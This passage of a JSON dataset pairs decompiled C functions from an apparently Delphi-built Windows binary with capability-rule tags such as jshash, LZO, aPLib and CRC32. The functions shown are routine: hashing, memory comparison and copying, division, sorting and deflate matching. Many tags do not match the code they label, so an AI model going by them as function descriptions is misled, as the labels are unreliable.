uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[2] + *0x49188c + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[9] + *0x491890 + ((~uVar4 | uVar2) ^ uVar3);\n    *in_EAX = *in_EAX + uVar4;\n    in_EAX[1] = in_EAX[1] + (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    in_EAX[2] = in_EAX[2] + uVar2;\n    in_EAX[3] = in_EAX[3] + uVar3;\n    return;\n}\n",
        "token_count": 4560
    },
    "00403980": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00403980(uint param_1, uint8_t *param_2)\n\n{\n    uint8_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    \n    uVar2 = *param_2;\n    piVar4 = in_EAX + 1;\n    piVar5 = param_2 + 1;\n    iVar1 = *in_EAX - uVar2;\n    if (*in_EAX < uVar2 || iVar1 == 0) {\n        uVar2 = uVar2 + iVar1;\n    }\n    uVar3 = uVar2 >> 2;\n    do {\n        if (uVar3 == 0) {\ncode_r0x004039c3:\n            uVar3 = uVar2 & 3;\n            uVar2 = uVar3;\n            if ((uVar3 == 0) ||\n               ((*piVar4 == *piVar5 &&\n                ((uVar2 = uVar3 - 1,  uVar2 == 0 ||\n                 ((*(piVar4 + 1) == *(piVar5 + 1) &&\n                  ((uVar2 = uVar3 - 2,  uVar2 == 0 || (*(piVar4 + 2) == *(piVar5 + 2))))))))))) {\n                iVar1 = iVar1 * 2;\n            }\ncode_r0x004039fe:\n            return CONCAT44(uVar2, iVar1);\n        }\n        if (*piVar4 != *piVar5) goto code_r0x004039fe;\n        if (uVar3 == 1) {\n            piVar4 = piVar4 + 1;\n            piVar5 = piVar5 + 1;\n            goto code_r0x004039c3;\n        }\n        if (piVar4[1] != piVar5[1]) goto code_r0x004039fe;\n        piVar4 = piVar4 + 2;\n        piVar5 = piVar5 + 2;\n        uVar3 = uVar3 - 2;\n    } while( true );\n}\n",
        "token_count": 484
    },
    "00403a04": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00403a04(uint32_t param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = param_1 >> 2;\n    do {\n        if (uVar1 == 0) {\ncode_r0x00403a34:\n            param_1 = param_1 & 3;\n            if (((param_1 != 0) && (*in_EAX == *param_2)) &&\n               ((param_1 == 1 ||\n                ((*(in_EAX + 1) == *(param_2 + 1) && ((param_1 == 2 || (*(in_EAX + 2) == *(param_2 + 2))))))))) {\n                return NULL;\n            }\n            return in_EAX;\n        }\n        if (*in_EAX != *param_2) {\n            return in_EAX;\n        }\n        if (uVar1 == 1) {\n            in_EAX = in_EAX + 1;\n            param_2 = param_2 + 1;\n            goto code_r0x00403a34;\n        }\n        if (in_EAX[1] != param_2[1]) {\n            return in_EAX;\n        }\n        in_EAX = in_EAX + 2;\n        param_2 = param_2 + 2;\n        uVar1 = uVar1 - 2;\n    } while( true );\n}\n",
        "token_count": 325
    },
    "0040464c": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404681)\n// WARNING: Removing unreachable block (ram,0x00404687)\n// WARNING: Removing unreachable block (ram,0x0040468e)\n// WARNING: Removing unreachable block (ram,0x00404694)\n// WARNING: Removing unreachable block (ram,0x0040469a)\n\nvoid __fastcall fcn.0040464c(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    \n    *param_2 = in_EAX;\n    uVar2 = *(in_EAX + -0x28);\n    uVar1 = uVar2 >> 2;\n    piVar3 = param_2 + 1;\n    while (uVar1 = uVar1 - 1,  uVar1 != 0) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    for (; *(in_EAX + -0x24) != NULL; in_EAX = **(in_EAX + -0x24)) {\n    }\n    return;\n}\n",
        "token_count": 325
    },
    "00405df4": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405df4(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (((in_EAX != param_2) && (in_EAX != NULL)) && (param_2 != NULL)) {\n        uVar2 = param_2[-1];\n        iVar1 = in_EAX[-1] - uVar2;\n        if (in_EAX[-1] < uVar2 || iVar1 == 0) {\n            uVar2 = uVar2 + iVar1;\n        }\n        uVar2 = uVar2 >> 2;\n        for (; ((uVar2 != 0 && (*in_EAX == *param_2)) && ((uVar2 != 1 && (in_EAX[1] == param_2[1]))));\n            in_EAX = in_EAX + 2) {\n            param_2 = param_2 + 2;\n            uVar2 = uVar2 - 2;\n        }\n    }\n    return;\n}\n",
        "token_count": 241
    },
    "0040a8d8": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a8d8(int32_t param_1, uint *param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    bool bVar4;\n    \n    bVar4 = param_1 == 0;\n    iVar1 = param_1;\n    puVar3 = param_2;\n    if (!bVar4) {\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar4 = *puVar3 == '\\0';\n            puVar3 = puVar3 + 1;\n        } while (!bVar4);\n        if (bVar4) {\n            iVar1 = iVar1 + 1;\n        }\n    }\n    for (uVar2 = param_1 - iVar1 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    for (uVar2 = param_1 - iVar1 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    *in_EAX = 0;\n    return;\n}\n",
        "token_count": 338
    },
    "0041cf28": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041cf28(uint32_t param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    while (param_1 != 0) {\n        uVar2 = *(in_EAX + 0x14) - *(in_EAX + 0x10);\n        if (*(in_EAX + 0x14) < *(in_EAX + 0x10) || uVar2 == 0) {\n            fcn.0041cf74();\n            uVar2 = *(in_EAX + 0x14);\n        }\n        if (param_1 <= uVar2) {\n            uVar2 = param_1;\n        }\n        param_1 = param_1 - uVar2;\n        iVar1 = *(in_EAX + 0x10);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + uVar2;\n        puVar4 = *(in_EAX + 8) + iVar1;\n        for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *param_2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            param_2 = param_2 + 1;\n        }\n        for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *param_2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            param_2 = param_2 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 399
    },
    "0041f3dc": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f3dc(uint32_t param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    while (param_1 != 0) {\n        uVar2 = *(in_EAX + 0xc) - *(in_EAX + 0x10);\n        if (*(in_EAX + 0xc) < *(in_EAX + 0x10) || uVar2 == 0) {\n            fcn.0041f428();\n            uVar2 = *(in_EAX + 0xc);\n        }\n        if (param_1 <= uVar2) {\n            uVar2 = param_1;\n        }\n        param_1 = param_1 - uVar2;\n        iVar1 = *(in_EAX + 0x10);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + uVar2;\n        puVar4 = *(in_EAX + 8) + iVar1;\n        for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar4 = *param_2;\n            param_2 = param_2 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *param_2;\n            param_2 = param_2 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 397
    },
    "0045f11c": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f11c(int32_t param_1, uint *param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    bool bVar4;\n    \n    bVar4 = param_1 == 0;\n    iVar1 = param_1;\n    puVar3 = param_2;\n    if (!bVar4) {\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar4 = *puVar3 == '\\0';\n            puVar3 = puVar3 + 1;\n        } while (!bVar4);\n        if (bVar4) {\n            iVar1 = iVar1 + 1;\n        }\n    }\n    for (uVar2 = param_1 - iVar1 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    for (uVar2 = param_1 - iVar1 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    *in_EAX = 0;\n    return;\n}\n",
        "token_count": 337
    },
    "0046ace8": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0046ace8(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    char *pcVar8;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    char cStack16;\n    char cStack15;\n    \n    uStack36 = *(in_EAX + 0x78);\n    uVar2 = *(in_EAX + 0x74);\n    pcVar3 = *(in_EAX + 0x34) + *(in_EAX + 0x68);\n    if (*(in_EAX + 0x28) - 0x106U < *(in_EAX + 0x68)) {\n        uVar6 = *(in_EAX + 0x68) - (*(in_EAX + 0x28) + -0x106);\n    }\n    else {\n        uVar6 = 0;\n    }\n    cStack16 = pcVar3[uVar2 - 1];\n    pcVar5 = *(in_EAX + 0x34) + *(in_EAX + 0x68);\n    cStack15 = pcVar3[uVar2];\n    if (*(in_EAX + 0x88) <= *(in_EAX + 0x74)) {\n        uStack36 = uStack36 >> 2;\n    }\n    uStack40 = param_2;\n    uStack32 = *(in_EAX + 0x8c);\n    if (*(in_EAX + 0x70) < *(in_EAX + 0x8c)) {\n        uStack32 = *(in_EAX + 0x70);\n    }\n    do {\n        pcVar8 = *(in_EAX + 0x34) + uStack40;\n        if ((((pcVar8[uVar2] == cStack15) && (pcVar8[uVar2 - 1] == cStack16)) && (*pcVar8 == *pcVar3)) &&\n           (pcVar8[1] == pcVar3[1])) {\n            pcVar8 = pcVar8 + 2;\n            pcVar3 = pcVar3 + 2;\n            while (((((pcVar4 = pcVar3 + 1,  *pcVar4 == pcVar8[1] && (pcVar4 = pcVar3 + 2,  *pcVar4 == pcVar8[2])) &&\n                     ((pcVar4 = pcVar3 + 3,  *pcVar4 == pcVar8[3] &&\n                      ((pcVar4 = pcVar3 + 4,  *pcVar4 == pcVar8[4] && (pcVar4 = pcVar3 + 5,  *pcVar4 == pcVar8[5]))))))\n                    && (pcVar4 = pcVar3 + 6,  *pcVar4 == pcVar8[6])) && (pcVar4 = pcVar3 + 7,  *pcVar4 == pcVar8[7]))) {\n                pcVar4 = pcVar3 + 8;\n                pcVar8 = pcVar8 + 8;\n                if ((*pcVar4 != *pcVar8) || (pcVar3 = pcVar4,  pcVar5 + 0x102 <= pcVar4)) break;\n            }\n            iVar1 = -((pcVar5 + 0x102) - pcVar4);\n            uVar7 = iVar1 + 0x102;\n            pcVar3 = pcVar5;\n            if (uVar2 < uVar7) {\n                *(in_EAX + 0x6c) = uStack40;\n                if (uStack32 <= uVar7) {\ncode_r0x0046ae47:\n                    uVar2 = *(in_EAX + 0x70);\n                    if (uVar7 <= uVar2) {\n                        uVar2 = uVar7;\n                    }\n                    return uVar2;\n                }\n                cStack16 = pcVar5[iVar1 + 0x101];\n                cStack15 = pcVar5[uVar7];\n                uVar2 = uVar7;\n            }\n        }\n        uVar7 = uVar2;\n        uStack40 = *(*(in_EAX + 0x3c) + (uStack40 & *(in_EAX + 0x30)) * 2);\n        if ((uStack40 <= uVar6) || (uStack36 = uStack36 - 1,  uVar2 = uVar7,  uStack36 == 0)) goto code_r0x0046ae47;\n    } while( true );\n}\n",
        "token_count": 1057
    },
    "00405694": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405694(uint param_1, int16_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    int16_t *piVar2;\n    \n    arg_8h = 0;\n    piVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; *piVar2 != 0; piVar2 = piVar2 + 4) {\n            if (piVar2[1] == 0) {\ncode_r0x004056bd:\n                piVar2 = piVar2 + 1;\n                break;\n            }\n            if (piVar2[2] == 0) {\ncode_r0x004056ba:\n                piVar2 = piVar2 + 1;\n                goto code_r0x004056bd;\n            }\n            if (piVar2[3] == 0) {\n                piVar2 = piVar2 + 1;\n                goto code_r0x004056ba;\n            }\n        }\n        arg_8h = piVar2 - param_2 >> 1;\n    }\n    if (arg_8h == 0) {\n        fcn.0040546c(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.0040558c(arg_8h),  -1 < iVar1)) {\n        fcn.0040555c();\n    }\n    else {\n        fcn.00405b8c();\n        fcn.0040558c(arg_8h);\n        fcn.00405b8c();\n    }\n    return;\n}\n",
        "token_count": 367
    },
    "004056f4": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004056f4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    \n    arg_8h = 0;\n    if (param_2 != 0) {\n        arg_8h = *(param_2 + -4) >> 1;\n    }\n    if (arg_8h == 0) {\n        fcn.0040546c(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.0040558c(arg_8h),  -1 < iVar1)) {\n        fcn.0040555c();\n    }\n    else {\n        fcn.00405b8c();\n        fcn.0040558c(arg_8h);\n        fcn.00405b8c();\n    }\n    return;\n}\n",
        "token_count": 203
    },
    "00405c84": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.00405c84(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*in_EAX != param_2) {\n        if ((param_2 == 0) || (*(param_2 + -4) >> 1 == 0)) {\n            iVar1 = *in_EAX;\n            if (iVar1 != 0) {\n                *in_EAX = 0;\n                sub.oleaut32.dll_SysFreeString(iVar1);\n            }\n            return;\n        }\n        iVar1 = sub.oleaut32.dll_SysReAllocStringLen();\n        if (iVar1 == 0) {\n            if (*0x493008 != NULL) {\n                (**0x493008)();\n            }\n            fcn.00402fe8();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "00405d8c": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.00405d8c(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    \n    uVar3 = 0;\n    piVar4 = param_2;\n    if (param_2 != NULL) {\n        for (; *piVar4 != 0; piVar4 = piVar4 + 2) {\n            if (*(piVar4 + 2) == 0) {\ncode_r0x00405db5:\n                piVar4 = piVar4 + 2;\n                break;\n            }\n            if (*(piVar4 + 1) == 0) {\ncode_r0x00405db2:\n                piVar4 = piVar4 + 2;\n                goto code_r0x00405db5;\n            }\n            if (*(piVar4 + 6) == 0) {\n                piVar4 = piVar4 + 2;\n                goto code_r0x00405db2;\n            }\n        }\n        uVar3 = piVar4 - param_2 >> 1;\n    }\n    if (uVar3 == 0) {\n        iVar2 = *in_EAX;\n        if (iVar2 != 0) {\n            *in_EAX = 0;\n            sub.oleaut32.dll_SysFreeString(iVar2);\n        }\n        return;\n    }\n    iVar2 = sub.oleaut32.dll_SysAllocStringLen(param_2, uVar3);\n    if (iVar2 != 0) {\n        iVar1 = *param_2;\n        *param_2 = iVar2;\n        sub.oleaut32.dll_SysFreeString(iVar1);\n        return;\n    }\n    if (*0x493008 != NULL) {\n        (**0x493008)();\n    }\n    fcn.00402fe8();\n    return;\n}\n",
        "token_count": 447
    },
    "00405de8": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.00405de8(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "00406410": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00406410(uint param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    bool bVar10;\n    \n    uVar8 = param_2 >> 0x1f;\n    uVar3 = (in_EAX ^ uVar8) - uVar8;\n    uVar6 = ((param_2 ^ uVar8) - uVar8) - ((in_EAX ^ uVar8) < uVar8);\n    uVar8 = param_4 >> 0x1f;\n    uVar9 = (param_2 ^ param_4) >> 0x1f;\n    uVar7 = (param_3 ^ uVar8) - uVar8;\n    uVar8 = ((param_4 ^ uVar8) - uVar8) - ((param_3 ^ uVar8) < uVar8);\n    if (uVar8 == 0) {\n        if (uVar7 <= uVar6) {\n            uVar8 = uVar6 / uVar7;\n            uVar6 = uVar6 % uVar7;\n        }\n        uVar3 = CONCAT44(uVar6, uVar3) / uVar7;\n    }\n    else {\n        bVar10 = (uVar8 & 1) != 0;\n        iVar4 = 0x1f;\n        if (uVar8 != 0) {\n            for (; uVar8 >> iVar4 == 0; iVar4 = iVar4 + -1) {\n            }\n        }\n        uVar5 = iVar4;\n        uVar1 = CONCAT44((uVar6 >> 1) >> (uVar5 & 0x1f), \n                         (uVar3 >> 1 | ((uVar6 & 1) != 0) << 0x1f) >> (uVar5 & 0x1f) |\n                         (uVar6 >> 1) << 0x20 - (uVar5 & 0x1f)) /\n                ((uVar7 >> 1 | bVar10 << 0x1f) >> (uVar5 & 0x1f) |\n                (uVar8 >> 1 | bVar10 << 0x1f) << 0x20 - (uVar5 & 0x1f));\n        iVar4 = uVar1;\n        iVar2 = (uVar1 & 0xffffffff) * uVar7;\n        uVar8 = (iVar2 >> 0x20) + (uVar8 & 0xfffffffe | bVar10) * iVar4;\n        uVar3 = iVar4 - (uVar6 < uVar8 || uVar6 - uVar8 < (uVar3 < iVar2));\n        uVar8 = 0;\n    }\n    return CONCAT44(((uVar8 ^ uVar9) - uVar9) - ((uVar3 ^ uVar9) < uVar9), (uVar3 ^ uVar9) - uVar9);\n}\n",
        "token_count": 742
    },
    "0041b480": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b480(code *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t in_ECX;\n    uint32_t in_EDX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = in_EDX;\n    do {\n        var_10h = var_8h + in_ECX >> 1;\n        uVar3 = var_8h;\n        uVar4 = in_ECX;\n        do {\n            while (iVar2 = (*arg_8h)(),  iVar2 < 0) {\n                uVar3 = uVar3 + 1;\n            }\n            while (iVar2 = (*arg_8h)(),  0 < iVar2) {\n                uVar4 = uVar4 - 1;\n            }\n            if (uVar3 <= uVar4) {\n                fcn.0041b188();\n                uVar1 = uVar4;\n                if ((uVar3 != var_10h) && (uVar1 = var_10h,  uVar4 == var_10h)) {\n                    uVar1 = uVar3;\n                }\n                var_10h = uVar1;\n                uVar3 = uVar3 + 1;\n                uVar4 = uVar4 - 1;\n            }\n        } while (uVar3 <= uVar4);\n        if (var_8h < uVar4) {\n            fcn.0041b480(arg_8h);\n        }\n        var_8h = uVar3;\n    } while (uVar3 < in_ECX);\n    return;\n}\n",
        "token_count": 397
    },
    "0040bd7c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bd7c(int32_t arg_8h)\n\n{\n    char *pcVar1;\n    char **ppcVar2;\n    \n    ppcVar2 = arg_8h + -4;\n    pcVar1 = *ppcVar2;\n    while (**ppcVar2 == *(arg_8h + -5)) {\n        *ppcVar2 = *ppcVar2 + 1;\n    }\n    *(arg_8h + -0xc) = *ppcVar2 + (1 - pcVar1);\n    return;\n}\n",
        "token_count": 127
    },
    "0041d18c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d18c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.0041fe78();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0041fe4c();\n            if ((*(iVar2 + 0x24) & 4) != 0) {\n                iVar2 = fcn.00406858();\n                fcn.00406a14(iVar2 + 1);\n                uVar3 = fcn.0041fe4c();\n                iVar2 = fcn.00406858();\n                *(*(arg_8h + -4) + -4 + iVar2 * 4) = uVar3;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "0041eaec": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041eaec(uint arg_8h)\n\n{\n    char cVar1;\n    \n    while( true ) {\n        cVar1 = fcn.0041cb0c();\n        if (cVar1 != '\\0') break;\n        fcn.0041eba0();\n    }\n    fcn.0041dbc8();\n    return;\n}\n",
        "token_count": 81
    },
    "0041eb44": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041eb44(uint arg_8h)\n\n{\n    char cVar1;\n    \n    while( true ) {\n        cVar1 = fcn.0041cb0c();\n        if (cVar1 != '\\0') break;\n        cVar1 = fcn.0041cf04();\n        if (cVar1 - 2U < 3) {\n            fcn.0041eba0();\n        }\n        fcn.0041efac();\n        while( true ) {\n            cVar1 = fcn.0041cb0c();\n            if (cVar1 != '\\0') break;\n            fcn.0041ed50();\n        }\n        fcn.0041dbc8();\n    }\n    fcn.0041dbc8();\n    return;\n}\n",
        "token_count": 172
    },
    "0042bf4c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid __fastcall fcn.0042bf4c(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint var_8h_2;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    int32_t *var_1ch_2;\n    uchar *var_18h;\n    int32_t var_14h;\n    uchar *var_10h;\n    int32_t var_ch_2;\n    uint var_8h_3;\n    \n    iVar8 = 0;\n    iVar5 = (param_1 + 1) * -4;\n    var_10h = &stack0xffffffd4 + iVar5;\n    puVar2 = &stack0xffffffd4 + iVar5;\n    var_1ch_2 = in_EAX;\n    var_ch_2 = param_1;\n    do {\n        puVar6 = puVar2;\n        *(puVar6 + -4) = 0x42bf7b;\n        iVar3 = fcn.0040a84c();\n        *(puVar6 + -4) = 0;\n        *(puVar6 + -8) = 0;\n        *(puVar6 + -0xc) = iVar3;\n        *(puVar6 + -0x10) = param_2;\n        *(puVar6 + -0x14) = 0;\n        *(puVar6 + -0x18) = 0;\n        *(puVar6 + -0x1c) = 0x42bf8c;\n        var_14h = sub.kernel32.dll_MultiByteToWideChar_1();\n        var_14h = var_14h + 1;\n        iVar5 = -(var_14h * 2 + 3U & 0xfffffffc);\n        var_18h = puVar6 + iVar5 + -0x18;\n        if (iVar8 == 0) {\n            *var_10h = puVar6 + iVar5 + -0x18;\n        }\n        else {\n            *(var_10h + (var_ch_2 - iVar8) * 4) = puVar6 + iVar5 + -0x18;\n            var_18h = puVar6 + iVar5 + -0x18;\n        }\n        *(puVar6 + iVar5 + -0x1c) = var_14h;\n        *(puVar6 + iVar5 + -0x20) = var_18h;\n        *(puVar6 + iVar5 + -0x24) = iVar3;\n        *(puVar6 + iVar5 + -0x28) = param_2;\n        *(puVar6 + iVar5 + -0x2c) = 0;\n        *(puVar6 + iVar5 + -0x30) = 0;\n        *(puVar6 + iVar5 + -0x34) = 0x42bfd1;\n        sub.kernel32.dll_MultiByteToWideChar_1();\n        *(var_18h + var_14h * 2 + -2) = 0;\n        param_2 = param_2 + iVar3 + 1;\n        iVar8 = iVar8 + 1;\n        puVar2 = puVar6 + iVar5 + -0x30;\n    } while (iVar8 != var_ch_2);\n    *(puVar6 + iVar5 + -0x34) = var_8h_2;\n    *(puVar6 + iVar5 + -0x38) = 0x42bff0;\n    uVar4 = sub.kernel32.dll_GetThreadLocale_1();\n    *(puVar6 + iVar5 + -0x38) = uVar4;\n    *(puVar6 + iVar5 + -0x3c) = var_ch_2;\n    *(puVar6 + iVar5 + -0x40) = var_10h;\n    *(puVar6 + iVar5 + -0x44) = *0x4927ec;\n    *(puVar6 + iVar5 + -0x48) = var_1ch_2;\n    pcVar1 = *(*var_1ch_2 + 0x14);\n    puVar7 = puVar6 + iVar5 + -0x4c;\n    *(puVar6 + iVar5 + -0x4c) = 0x42c008;\n    iVar5 = (*pcVar1)();\n    if (iVar5 == -0x7ffdfffa) {\n        *(puVar7 + -4) = &stack0xfffffffc;\n        *(puVar7 + -8) = 0x42c015;\n        fcn.0042bf18(*(puVar7 + -4));\n    }\n    else {\n        *(puVar7 + -4) = 0x42c01d;\n        fcn.0042b52c();\n    }\n    return;\n}\n",
        "token_count": 1146
    },
    "00436370": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00436370(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t unaff_EBX;\n    \n    iVar1 = fcn.0040e840();\n    if (iVar1 != 0) {\n        fcn.004059a4();\n    }\n    return unaff_EBX & 0xffffff00 | iVar1 != 0;\n}\n",
        "token_count": 88
    },
    "0043be8c": {
